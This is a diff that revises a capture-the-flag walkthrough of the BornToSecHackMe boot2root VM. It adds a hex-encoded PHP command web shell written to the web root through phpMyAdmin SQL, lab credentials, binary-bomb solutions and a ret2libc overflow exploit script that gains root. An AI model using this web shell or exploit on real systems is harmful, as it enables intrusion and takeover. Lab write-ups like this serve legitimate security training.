@@ -2,41 +2,41 @@
 
 ## 1. Network Setup and Discovery
 
-The analyst configured the virtual machine with a **host-only adapter** to perform internal reconnaissance. An `nmap` scan revealed the presence of a target machine running **HTTP (port 80)** and **HTTPS (port 443)** services.
+configure the virtual machine with a **host-only adapter** to enable internal reconnaissance. An `nmap` scan revealed that the target system was running the following services:
 
-* **HTTPS**: Returned an empty or default response.
-* **HTTP**: Served a default placeholder page.
+* **HTTP (port 80)**: Served a default placeholder page.
+* **HTTPS (port 443)**: Returned an empty or default response.
 
 ## 2. Directory Enumeration
 
-Using a common wordlist, a directory fuzzing scan was performed against the HTTP service. The scan revealed the following accessible endpoints:
+Directory fuzzing was performed using a common wordlist against the HTTP service. The following accessible endpoints were identified:
 
 * `/forum`
 * `/phpmyadmin`
 * `/webmail`
 
-Both `phpMyAdmin` and `webmail` were login-protected. The analyst therefore focused on exploring the forum.
+Both `/phpmyadmin` and `/webmail` were protected by login interfaces. let's investigate the `/forum` directory for additional information.
 
 ## 3. Forum Analysis and Credential Discovery
 
-Within the forum, a post by a user contained log snippets from 2015:
+A forum post contained log entries from 2015:
 
 ```
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
 Oct 5 08:46:01 BornToSecHackMe CRON[7549]: session opened for user lmezard
 ```
 
-The log suggested a failed brute-force attempt using the password `!q\]Ej?*5K5cy*AJ`, followed by a successful CRON job initiated under the `lmezard` user.
+These logs indicated a failed SSH login attempt using the password `!q\]Ej?*5K5cy*AJ`, followed by successful activity under the `lmezard` account via CRON.
 
-The analyst attempted to log in to the forum using the `lmezard` username and the extracted password. Authentication succeeded.
+Let's attempt to authenticate to the forum using the `lmezard` username and the extracted password. This login succeeded. Inside the user profile, the associated email address was revealed:
 
-Upon logging in, user settings revealed the email address: `laurie@borntosec.net`.
+```
+laurie@borntosec.net
+```
 
 ## 4. Webmail Access and Credential Escalation
 
-An attempt was made to log in to the **webmail** interface using the discovered email and the same password. This login was successful.
-
-An email was found containing database credentials:
+Using the email and previously discovered password, We can successfully loggin into the **webmail** interface. An email was found containing database credentials:
 
 **Subject:** DB Access
 **From:** [qudevide@mail.borntosec.net](mailto:qudevide@mail.borntosec.net)
@@ -53,42 +53,49 @@ Best regards.
 
 ## 5. phpMyAdmin Exploitation
 
-Using the credentials `root / Fg-'kKXBj87E:aJ$`, the analyst accessed **phpMyAdmin**.
+Using the discovered credentials:
 
-Within the interface, multiple databases were available. Importantly, the analyst had the ability to **write files to the web root**, enabling remote code execution.
+```
+Username: root  
+Password: Fg-'kKXBj87E:aJ$
+```
+
+We can login into **phpMyAdmin**. Several databases were accessible, and file write permissions were confirmed — including the ability to write directly to the web root directory.
+
+This allowed remote code execution through the deployment of a custom PHP payload.
 
 ## 6. Web Shell Deployment
 
-A PHP reverse shell was obtained from [revshells.com](https://www.revshells.com/) and converted into hexadecimal format. The payload was then written to the web server’s accessible template directory using SQL:
+A PHP reverse shell was generated via [revshells.com](https://www.revshells.com/) and encoded in hexadecimal. Using SQL commands, the payload was written to a writable location on the web server:
 
 ```sql
-SET @bin = 0x[hex of php shell];
+SET @bin = 0x3C68746D6C3E0A3C626F64793E0A3C666F726D206D6574686F643D2247455422206E616D653D223C3F706870206563686F20626173656E616D6528245F5345525645525B275048505F53454C46275D293B203F3E223E0A3C696E70757420747970653D225445585422206E616D653D22636D64222069643D22636D64222073697A653D223830223E0A3C696E70757420747970653D225355424D4954222076616C75653D2245786563757465223E0A3C2F666F726D3E0A3C7072653E0A3C3F7068700A20202020696628697373657428245F4745545B27636D64275D29290A202020207B0A202020202020202073797374656D28245F4745545B27636D64275D293B0A202020207D0A3F3E0A3C2F7072653E0A3C2F626F64793E0A3C7363726970743E646F63756D656E742E676574456C656D656E74427949642822636D6422292E666F63757328293B3C2F7363726970743E0A3C2F68746D6C3E;
 SELECT @bin INTO DUMPFILE '/var/www/forum/templates_c/cmd.php';
 ```
 
-This granted remote code execution capabilities via the web interface. From here, the analyst could either issue individual commands or deploy a reverse shell for further interaction.
+This granted remote code execution capabilities via the web interface. From here, We could either issue individual commands or deploy a reverse shell for further interaction.
 
 ## 7. Privilege Escalation and Enumeration
 
-While enumerating the system, the analyst discovered the directory:
+While exploring the file system, the following directory was discovered:
 
 ```
 /home/LOOKATME
 ```
 
-Inside was a credential file containing:
+Inside, a credentials file contained:
 
 ```
 lmezard:G!@M6f4Eatau{sF"
 ```
 
-These credentials permitted local login as user **lmezard**, although SSH access was not available. Only local shell access was viable from the compromised web shell.
+These credentials allowed local login as `lmezard`. Since SSH was not enabled for this user, access can be obtain through the machine in virtual box.
 
 ## 8. Binary and File Analysis
 
-Within `lmezard`’s home directory, a file named `fun` was found. This file was transferred to a writable location, downloaded, and analyzed. It was a **tar archive** containing a series of `.pcap` files.
+Within `lmezard`'s home directory, a file named `fun` was discovered. Upon inspection, it was a **tar archive** containing multiple `.pcap` files. Each `.pcap` held fragments of **C source code** within the packet payloads.
 
-Each `.pcap` contained fragments of **C source code**, embedded within the payloads. A custom Python script was written to reconstruct the complete C file:
+Let's write a Python script to extract and reconstruct the C code:
 
 ```python
 import os
@@ -126,7 +133,7 @@ if __name__ == "__main__":
     main()
 ```
 
-The reconstructed source code was saved as `first.c`, compiled, and executed:
+The resulting source code was saved as `first.c`, compiled, and executed:
 
 ```bash
 python3 ./flag02.py > first.c
@@ -134,28 +141,25 @@ gcc first.c -o test
 ./test
 ```
 
-The output contained the following string:
+The program output:
 
 ```
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit%
 ```
 
-The password was then hashed as required:
+The password was hashed using SHA-256 as required:
 
 ```bash
 echo -n Iheartpwnage | sha256sum
 # 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
 
-
-## Laurie
-
-### 1. Overview
-
-This stage emulates the “binary bomb” exercise, requiring decompilation and reverse engineering of each phase within a provided executable. Failure to supply the correct input for any phase triggers the `explode_bomb()` function.
-
 ---
+
+## Laurie Challenge
+
+This phase mimics a **binary bomb** exercise. The binary requires solving multiple logic-based stages. Any incorrect input triggers the `explode_bomb()` function.
 
 ### Phase 1: Exact String Match
 
@@ -168,16 +172,34 @@ void phase_1(undefined4 param_1)
 }
 ```
 
-* **Requirement:** Supply the exact phrase
-* **Solution:**
+**Solution:**
 
-  ```
-  Public speaking is very easy.
-  ```
-
----
+```
+Public speaking is very easy.
+```
 
 ### Phase 2: Factorial Sequence
+
+```c
+void phase_2(undefined4 param_1)
+{
+  int iVar1;
+  int aiStack_20 [7];
+  
+  read_six_numbers(param_1,aiStack_20 + 1);
+  if (aiStack_20[1] != 1) {
+    explode_bomb();
+  }
+  iVar1 = 1;
+  do {
+    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
+      explode_bomb();
+    }
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  return;
+}
+```
 
 The function expects six integers $a_1$ through $a_6$ satisfying:
 
@@ -188,24 +210,96 @@ a_{i+1} &= (i+1)\times a_i \quad\text{for }1 \le i \le 5.
 \end{aligned}
 $$
 
-* **Computed Sequence:**
+**Computed Sequence:**
 
-  1. $a_1 = 1$
-  2. $a_2 = 2\times1 = 2$
-  3. $a_3 = 3\times2 = 6$
-  4. $a_4 = 4\times6 = 24$
-  5. $a_5 = 5\times24 = 120$
-  6. $a_6 = 6\times120 = 720$
+1. $a_1 = 1$
+2. $a_2 = 2\times1 = 2$
+3. $a_3 = 3\times2 = 6$
+4. $a_4 = 4\times6 = 24$
+5. $a_5 = 5\times24 = 120$
+6. $a_6 = 6\times120 = 720$
 
-* **Solution:**
+**Solution:**
 
-  ```
-  1 2 6 24 120 720
-  ```
-
----
+```
+1 2 6 24 120 720
+```
 
 ### Phase 3: Lookup Table Validation
+
+```c
+void phase_3(char *param_1)
+
+{
+  int iVar1;
+  char cVar2;
+  undefined4 local_10;
+  char local_9;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
+  if (iVar1 < 3) {
+    explode_bomb();
+  }
+  switch(local_10) {
+  case 0:
+    cVar2 = 'q';
+    if (local_8 != 0x309) {
+      explode_bomb();
+    }
+    break;
+  case 1:
+    cVar2 = 'b';
+    if (local_8 != 0xd6) {
+      explode_bomb();
+    }
+    break;
+  case 2:
+    cVar2 = 'b';
+    if (local_8 != 0x2f3) {
+      explode_bomb();
+    }
+    break;
+  case 3:
+    cVar2 = 'k';
+    if (local_8 != 0xfb) {
+      explode_bomb();
+    }
+    break;
+  case 4:
+    cVar2 = 'o';
+    if (local_8 != 0xa0) {
+      explode_bomb();
+    }
+    break;
+  case 5:
+    cVar2 = 't';
+    if (local_8 != 0x1ca) {
+      explode_bomb();
+    }
+    break;
+  case 6:
+    cVar2 = 'v';
+    if (local_8 != 0x30c) {
+      explode_bomb();
+    }
+    break;
+  case 7:
+    cVar2 = 'b';
+    if (local_8 != 0x20c) {
+      explode_bomb();
+    }
+    break;
+  default:
+    cVar2 = 'x';
+    explode_bomb();
+  }
+  if (cVar2 != local_9) {
+    explode_bomb();
+  }
+  return;
+}
+```
 
 Phase 3 reads three tokens: an integer `n` (0–7), a character `c`, and an integer `v`. It then verifies that $(n,c,v)$ matches one of eight hard-coded triples:
 
@@ -220,21 +314,55 @@ Phase 3 reads three tokens: an integer `n` (0–7), a character `c`, and an inte
 |  6  |  v  | 0x30c |    780    |
 |  7  |  b  | 0x20c |    524    |
 
-* **Simplest Valid Input:**
+**Simplest Valid Input:**
 
-  ```
-  0 q 777
-  ```
+```
+0 q 777
+```
 
-* **Alternate Example (as per README hint):**
+**Alternate Example (as per README hint):**
 
-  ```
-  1 b 214
-  ```
+```
+1 b 214
+```
 
----
+### Phase 4: Fibonacci Check
 
-### Phase 4: Fibonacci Sequence Check
+```c
+int func4(int param_1)
+{
+  int iVar1;
+  int iVar2;
+  
+  if (param_1 < 2) {
+    iVar2 = 1;
+  }
+  else {
+    iVar1 = func4(param_1 + -1);
+    iVar2 = func4(param_1 + -2);
+    iVar2 = iVar2 + iVar1;
+  }
+  return iVar2;
+}
+
+
+
+void phase_4(char *param_1)
+{
+  int iVar1;
+  int local_8;
+  
+  iVar1 = sscanf(param_1,"%d",&local_8);
+  if ((iVar1 != 1) || (local_8 < 1)) {
+    explode_bomb();
+  }
+  iVar1 = func4(local_8);
+  if (iVar1 != 0x37) {
+    explode_bomb();
+  }
+  return;
+}
+```
 
 The code computes a Fibonacci‐style function `func4(n)`:
 
@@ -246,22 +374,47 @@ func4(n) = func4(n-1) + func4(n-2)  for n ≥ 2
 
 It then requires `func4(n) == 0x37` (decimal 55).
 
-* **Fibonacci Values:**
+**Fibonacci Values:**
 
-  ```
-  n : 0  1  2   3   4   5    6    7    8     9
-  f : 1  1  2   3   5   8   13   21   34   55
-  ```
+```
+n : 0  1  2   3   4   5    6    7    8     9
+f : 1  1  2   3   5   8   13   21   34   55
+```
 
-* **Solution:**
+**Solution:**
 
-  ```
-  9
-  ```
+```
+9
+```
 
----
+### Phase 5: Bitmask and Character Mapping
 
-### Phase 5: 6-Character Transformation
+```c
+void phase_5(int param_1)
+
+{
+  int iVar1;
+  undefined1 local_c [6];
+  undefined1 local_6;
+  
+  iVar1 = string_length(param_1);
+  if (iVar1 != 6) {
+    explode_bomb();
+  }
+  iVar1 = 0;
+  do {
+    local_c[iVar1] = (&array_123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  local_6 = 0;
+  printf(local_c);
+  iVar1 = strings_not_equal(local_c,"giants");
+  if (iVar1 != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
 
 Phase 5 expects a 6-character input string. For each character, it:
 
@@ -281,8 +434,7 @@ Any mismatch triggers `explode_bomb()`.
 
 const char buffer[] = "isrveawhobpnutfg";
 
-void
-validator(const char* str1, const char* str2)
+void validator(const char* str1, const char* str2)
 {
     char arr[7] = {0};
 
@@ -295,8 +447,7 @@ validator(const char* str1, const char* str2)
         printf("[ OK ] output: %s\n", arr);
 }
 
-const int*
-indexListGenerator(char const* str) {
+const int* indexListGenerator(char const* str) {
     static int list[6] = {0};
     char* tmp;
 
@@ -318,8 +469,7 @@ indexListGenerator(char const* str) {
     return list;
 }
 
-const char*
-arrayGenerator(const int* list)
+const char* arrayGenerator(const int* list)
 {
     static char arr[7] = {0};
 
@@ -330,8 +480,7 @@ arrayGenerator(const int* list)
     return arr;
 }
 
-int
-main(int argc, char** argv)
+int main(int argc, char** argv)
 {
     if (argc != 2 || strlen(argv[1]) != 6)
         return 1;
@@ -350,17 +499,76 @@ This program does:
 
 Once the correct mapping is found, only one 6-character string yields `"giants"`:
 
-* **Solution (phase 5 password):**
+**Solution (phase 5 password):**
 
-  ```
-  opekmq
-  ```
+```
+opekmq
+```
 
-*(Exact input withheld to preserve challenge integrity.)*
+### Phase 6: Linked-List Sorting Check
 
----
+```c
+void phase_6(undefined4 param_1)
 
-### Phase 6: Linked-List Ordering
+{
+  int *piVar1;
+  int iVar2;
+  undefined1 *puVar3;
+  int *piVar4;
+  int iVar5;
+  undefined1 *local_38;
+  int *local_34;
+  int local_30 [5];
+  int local_1c [6];
+  
+  local_38 = node1;
+  read_six_numbers(param_1,local_1c);
+  iVar5 = 0;
+  do {
+    iVar2 = iVar5;
+    if (5 < local_1c[iVar5] - 1U) {
+      explode_bomb();
+    }
+    while (iVar2 = iVar2 + 1, iVar2 < 6) {
+      if (local_1c[iVar5] == local_1c[iVar2]) {
+        explode_bomb();
+      }
+    }
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 6);
+  iVar5 = 0;
+  do {
+    iVar2 = 1;
+    puVar3 = local_38;
+    if (1 < local_1c[iVar5]) {
+      do {
+        puVar3 = *(undefined1 **)(puVar3 + 8);
+        iVar2 = iVar2 + 1;
+      } while (iVar2 < local_1c[iVar5]);
+    }
+    local_30[iVar5 + -1] = (int)puVar3;
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 6);
+  iVar5 = 1;
+  piVar4 = local_34;
+  do {
+    piVar1 = (int *)local_30[iVar5 + -1];
+    piVar4[2] = (int)piVar1;
+    iVar5 = iVar5 + 1;
+    piVar4 = piVar1;
+  } while (iVar5 < 6);
+  piVar1[2] = 0;
+  iVar5 = 0;
+  do {
+    if (*local_34 < *(int *)local_34[2]) {
+      explode_bomb();
+    }
+    local_34 = (int *)local_34[2];
+    iVar5 = iVar5 + 1;
+  } while (iVar5 < 5);
+  return;
+}
+```
 
 Phase 6 reads six distinct integers (each 1–6) into an array. It then:
 
@@ -371,79 +579,161 @@ Phase 6 reads six distinct integers (each 1–6) into an array. It then:
 
 By automating enumeration (e.g., via GDB scripting), the correct permutation was determined:
 
-* **Solution:**
+**Solution:**
 
-  ```
-  4 2 6 1 3 5
-  ```
+```
+4 2 6 1 3 5
+```
 
 ---
 
-**Complete Bomb-Defusal Input Sequence**
-
-Putting all phases together, the full sequence to defuse the bomb is:
+**Complete Bomb Solution**
 
 ```
-Phase 1:  Public speaking is very easy.
-Phase 2:  1 2 6 24 120 720
-Phase 3:  0 q 777
-Phase 4:  9
-Phase 5:  opekmq
-Phase 6:  4 2 6 1 3 5
+Public speaking is very easy.
+1 2 6 24 120 720
+0 q 777
+9
+opekmq
+4 2 6 1 3 5
 ```
 
-the password for thor is
+**Password for thor:**
 
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
-## Thor 
+---
+
+## Thor Challenge
 
 ### 1. Initial Enumeration
 
-During the post-exploitation phase, the analyst navigated to a directory named `thor`. Within this folder, two files were identified:
+Within the `thor` directory, the following files were found:
 
 * `README`
 * `turtle`
 
-The `README` file indicated that completing the challenge would grant access to the user **zaz**.
+The `README` file suggested that completing this stage would yield access to the **zaz** user.
 
 ### 2. Turtle File Analysis
 
-The `turtle` file appeared to contain a set of instructions resembling a command or scripting language. Upon further investigation, the instructions were recognized as commands intended for **Turtle Graphics**—a Python-based drawing library used for educational purposes.
+The `turtle` file contained Python-like instructions recognizable as **Turtle Graphics** commands. These were parsed and rendered using a custom script.
 
-### 3. Visualization and Message Extraction
+### 3. Drawing Analysis and Hashing
 
-To interpret the instructions, the analyst wrote a custom script to parse the turtle commands and generate the corresponding graphic. The output of the rendered turtle script was a drawing composed of several capital letters:
-
-* Two **S** characters
-* One **A**
-* One **H**
-* One **L**
-
-Based on the drawing order and instructions, the intended sequence appeared to be:
+The visual output formed the word:
 
 ```
 SLASH
 ```
 
-This string matched the context provided in the `turtle` file, which included the hint:
+Given the hint "Can you digest the message?", the analyst tested multiple hashing algorithms. The correct hash was obtained using **MD5**:
 
-> *"Can you digest the message? :)"*
+```bash
+echo -n SLASH | md5sum
+```
 
-The hint implied that the extracted string should be **hashed**, similar to previous steps in the Boot2Root challenge. The SHA-256 hash was attepted, but it did not produce the correct result.
-
-After testing multiple hashing algorithms, it was determined that **MD5** was the intended method. Hashing the string `SLASH` with MD5 produced the following digest:
+Result:
 
 ```
 646da671ca01bb5d84dbb5fb2238dc8e
 ```
 
-This hash served as the **password for user zaz**, allowing access to the next stage of the machine.
+This served as the **password for user zaz**.
 
-### Additional Resources
+---
 
-* [Turtle Graphics Online Interpreter](https://trinket.io/turtle)
+## ZAZ Exploit – Stack-Based Buffer Overflow
 
+### 1. Environment Checks
 
+#### ASLR
+
+```bash
+cat /proc/sys/kernel/randomize_va_space
+# Output: 0
+```
+
+ASLR was **disabled**, making memory addresses static across executions.
+
+#### Stack Permissions
+
+```bash
+readelf -l exploit_me
+# Look for: GNU_STACK ... RWE
+```
+
+The presence of the `E` flag indicates that the **stack is executable**, though the exploit uses **ret2libc** instead of direct shellcode injection.
+
+---
+
+### 2. Binary Analysis
+
+The vulnerable binary uses `strcpy()` to copy user input into a fixed-size buffer without bounds checking:
+
+```c
+(insert Ghidra decompiled snippet)
+```
+
+This creates a classic buffer overflow scenario.
+
+---
+
+### 3. Confirming the Overflow
+
+```bash
+./exploit_me $(python -c 'print("A"*144)')
+```
+
+A segmentation fault and GDB inspection confirm that the return address is overwritten after **144 bytes**.
+
+---
+
+### 4. Crafting the ret2libc Payload
+
+**Addresses:**
+
+```gdb
+# system
+0xb7e6b060
+# exit
+0xb7e5ebe0
+# "/bin/sh"
+0xb7f8cc58
+```
+
+**Python Exploit Script:**
+
+```python
+from pwn import p32
+
+payload  = b"A" * 140
+payload += p32(0xb7e6b060)  # system
+payload += p32(0xb7e5ebe0)  # exit
+payload += p32(0xb7f8cc58)  # /bin/sh
+
+with open("payload", "wb") as f:
+    f.write(payload)
+```
+
+---
+
+### 5. Payload Execution
+
+Transfer and execute the payload:
+
+```bash
+base64 payload > payload.b64
+# Transfer to VM and decode
+base64 -d payload.b64 > final_payload
+./exploit_me $(cat final_payload)
+```
+
+Result:
+
+```bash
+# whoami
+root
+```
